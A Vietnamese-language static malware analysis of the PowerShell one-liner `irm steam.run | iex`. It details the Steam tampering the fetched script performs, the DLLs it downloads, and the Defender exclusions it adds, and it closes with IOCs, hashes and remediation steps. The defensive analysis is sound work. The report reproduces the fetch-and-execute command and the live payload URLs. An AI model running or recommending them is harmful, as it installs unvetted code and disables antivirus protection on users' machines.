# Phân tích lệnh `irm steam.run | iex` (không thực thi)

## 1) Phạm vi & cách làm
- Thời điểm phân tích: 2026-03-25.
- Cách làm: chỉ tải file và phân tích tĩnh (static), KHÔNG chạy `iex`, KHÔNG chạy các DLL/payload.
- Mục tiêu: xác định lệnh làm gì, tải gì, và ảnh hưởng tới hệ thống.

## 2) Tóm tắt nhanh
Lệnh `irm steam.run | iex` tải script PowerShell từ `https://steam.run/` rồi thực thi ngay trong phiên hiện tại.

Script đó:
- dừng Steam,
- sửa/xóa file trong thư mục Steam,
- thêm Windows Defender Exclusion cho DLL mới,
- tải 2 DLL từ domain ngoài qua HTTP,
- sửa registry nhánh `HKCU:\Software\Valve\Steamtools`,
- mở Steam lại.

=> Đây KHÔNG chỉ là "cài đặt vô hại". Nó có can thiệp hệ thống ở mức process/file/registry/defender và nạp DLL lạ vào tiến trình Steam.

## 3) Chuỗi tải file (download chain)
### 3.1 Bootstrap
- URL: `https://steam.run/`
- Content-Type: `text/plain; charset=UTF-8`
- File lưu local: `steam.run.ps1`

### 3.2 Payload do script tải
Script tải trực tiếp 2 file nhị phân:
- `http://update.aaasn.com/update` -> ghi thành `xinput1_4.dll` trong thư mục Steam
- `http://update.aaasn.com/dwmapi` -> ghi thành `dwmapi.dll` trong thư mục Steam

File đã lưu để phân tích:
- `payload_update.bin` (bản local của `/update`)
- `payload_dwmapi.bin` (bản local của `/dwmapi`)

### 3.3 Endpoint phụ xuất hiện trong payload
Trong `payload_update.bin` có chuỗi URL:
- `http://update.steamcdn.com/version`
- `http://update.wudrm.com/version`
- `https://update.aaasn.com/version`
- `https://update.tnkjmec.com/version`

Các endpoint này trả blob nhị phân dài 672 bytes (đã lưu local):
- `version_update_aaasn.bin`
- `version_update_steamcdn.bin`
- `version_update_tnkjmec.bin`
- `version_update_wudrm.bin`

## 4) Hành vi chi tiết của `steam.run.ps1`
1. Xóa file `~/get.ps1` nếu có.
2. Force stop process `steam.exe` (kèm fallback `taskkill /f`).
3. Đọc registry `HKCU:\Software\Valve\Steam\SteamPath` để tìm thư mục Steam.
4. Nếu không có Steam path thì báo lỗi và thoát.
5. Xóa một số file trong thư mục Steam nếu tồn tại:
   - `xinput1_4.dll`
   - `user32.dll`
   - `steam.cfg`
   - `package\beta`
   - `version.dll`
6. Xóa thư mục `%LOCALAPPDATA%\Microsoft\Tencent` nếu tồn tại.
7. Gọi `Add-MpPreference -ExclusionPath` để thêm loại trừ Defender cho:
   - `xinput1_4.dll`
   - `dwmapi.dll`
8. Tải và ghi DLL mới vào thư mục Steam:
   - `/update` -> `xinput1_4.dll`
   - `/dwmapi` -> `dwmapi.dll`
9. Tạo/sửa key `HKCU:\Software\Valve\Steamtools`:
   - xóa các value `ActivateUnlockMode`, `AlwaysStayUnlocked`, `notUnlockDepot`
   - set `iscdkey = "true"`
10. Chạy `steam.exe` và `steam://`, rồi đóng cửa sổ PowerShell.

## 5) Phân tích các file nhị phân
## 5.1 `payload_update.bin`
- Định dạng: PE DLL x64 (`MZ` + `PE`).
- Kích thước: 673,720 bytes.
- Chữ ký số: Valid.
  - Subject: `NewWnight Global Tech Co., Ltd`
  - Issuer: `GlobalSign GCC R45 EV CodeSigning CA 2020`
- Dấu hiệu kỹ thuật:
  - Import network/crypto (WS2_32, CRYPT32, ADVAPI32, ...)
  - Có chuỗi `libcurl`, HTTP/HTTPS, các URL `/version` nêu trên
  - Có chuỗi liên quan Steam IPC:
    - `Global\Valve_SteamIPC_Class`
    - `Global\Vale_SteamIPC_Class%u`
  - Có chuỗi `CreateProcessW`, `LoadLibrary*`, `GetProcAddress`
- Export table hiển thị nhiều hàm `cJSON_*` (kiểu thư viện JSON). Điều này không chứng minh file "an toàn"; logic chính có thể nằm trong `DllMain`/code nội bộ.

## 5.2 `payload_dwmapi.bin`
- Định dạng: PE DLL x64.
- Kích thước: 136,120 bytes.
- Chữ ký số: Valid (cùng signer với file trên).
- Dấu hiệu kỹ thuật:
  - Import chủ yếu từ `KERNEL32.dll`.
  - Có `LoadLibraryExW`, `GetProcAddress`, thao tác file/bộ nhớ.
  - Không thấy export table rõ ràng (có thể đóng vai trò loader/khởi tạo khi được nạp).

## 5.3 `version_update_*.bin`
- Không phải PE executable (không có header `MZ`, `objdump` báo `file format not recognized`).
- Kích thước nhỏ cố định: 672 bytes.
- Entropy cao (~7.69 bits/byte): giống dữ liệu mã hóa hoặc nén.
- Không có chuỗi rõ ràng mang nghĩa cấu hình plaintext.

Kết luận phần này:
- `version_update_*.bin` KHÔNG "tự chạy" như EXE/DLL.
- Nhiều khả năng đây là blob dữ liệu (config/key/update descriptor) được DLL chính tải về rồi giải mã/đọc ở runtime.

## 6) Trả lời câu hỏi "file version_update_aaasn.bin chạy sao?"
Nó không phải file thực thi độc lập. Để biết "chạy gì/làm gì", cần theo dõi DLL đang dùng blob này trong môi trường cô lập.

Cách kiểm chứng đúng:
1. Dùng VM snapshot riêng (không chạy trên máy chính).
2. Chạy mẫu với giám sát:
   - Procmon (file/registry/process)
   - Wireshark/Fiddler (network)
   - API monitor/EDR sandbox (LoadLibrary, VirtualAlloc, CreateProcess, WriteProcessMemory...)
3. So sánh trước/sau để thấy hành vi thực tế.

Nếu chỉ dựa static ở máy hiện tại, ta chỉ kết luận được mức "khả nghi cao" và vai trò "blob cấu hình/cập nhật".

## 7) Mức ảnh hưởng hệ thống
Không đúng khi nói "không ảnh hưởng hệ thống".

Nó ảnh hưởng trực tiếp:
- Process: kill Steam, mở lại Steam.
- File system: xóa/ghi đè DLL và file cấu hình trong thư mục Steam.
- Registry: tạo/sửa key `HKCU:\Software\Valve\Steamtools`.
- Security controls: thêm Defender Exclusion.
- Network: tải payload từ domain ngoài.

## 8) Mục đích: chỉ can thiệp Steam hay không?
- Rõ ràng mục tiêu chính là can thiệp Steam (DLL drop/hijack, sửa key `Steamtools`, thông điệp "activation").
- Tuy nhiên KHÔNG thể khẳng định "chỉ Steam" vì payload có khả năng mạng + process + load DLL động.
- Bất kỳ DLL lạ nạp vào process người dùng đều có thể làm thêm hành vi khác ngoài mục đích hiển thị.

## 9) IOC (Indicators of Compromise)
### 9.1 Domain/URL
- `https://steam.run/`
- `http://update.aaasn.com/update`
- `http://update.aaasn.com/dwmapi`
- `http://update.steamcdn.com/version`
- `http://update.wudrm.com/version`
- `https://update.aaasn.com/version`
- `https://update.tnkjmec.com/version`

### 9.2 File hash (SHA256)
- `steam.run.ps1`
  - `A288FB94F172732AADE47F5EEA5D5B4DE5DCCF55F962349CC9D799C7EF2EEDAA`
- `payload_update.bin`
  - `DDB1F0909C7092F06890674F90B5D4F1198724B05B4BF1E656B4063897340243`
- `payload_dwmapi.bin`
  - `1CE49ED63AF004AD37A4D2921A5659A17001C4C0026D6245FCC0D543E9C265D0`
- `version_update_aaasn.bin`
  - `97665C1943F20F6FEC55BF08067DFD7281DC7C3A21A41011FB7931C718A123B6`
- `version_update_steamcdn.bin`
  - `97665C1943F20F6FEC55BF08067DFD7281DC7C3A21A41011FB7931C718A123B6`
- `version_update_tnkjmec.bin`
  - `97665C1943F20F6FEC55BF08067DFD7281DC7C3A21A41011FB7931C718A123B6`
- `version_update_wudrm.bin`
  - `01FB76CB3F967AEC931E3784DF9F46D8CF97EDB67D1975A91616076ADDEE44C9`

## 10) Khuyến nghị
- Không chạy lệnh này trên máy chính.
- Nếu đã lỡ chạy:
  - kiểm tra file lạ trong thư mục Steam (`xinput1_4.dll`, `dwmapi.dll`, `version.dll`, ...)
  - kiểm tra Defender exclusions
  - kiểm tra key `HKCU:\Software\Valve\Steamtools`
  - đổi mật khẩu Steam, bật Steam Guard, rà thiết bị đăng nhập.
- Muốn phân tích sâu hành vi runtime: dùng VM sandbox riêng và snapshot rollback.

---
Tài liệu này dựa trên phân tích tĩnh các mẫu tải tại thời điểm nêu trên; payload có thể thay đổi theo thời gian.
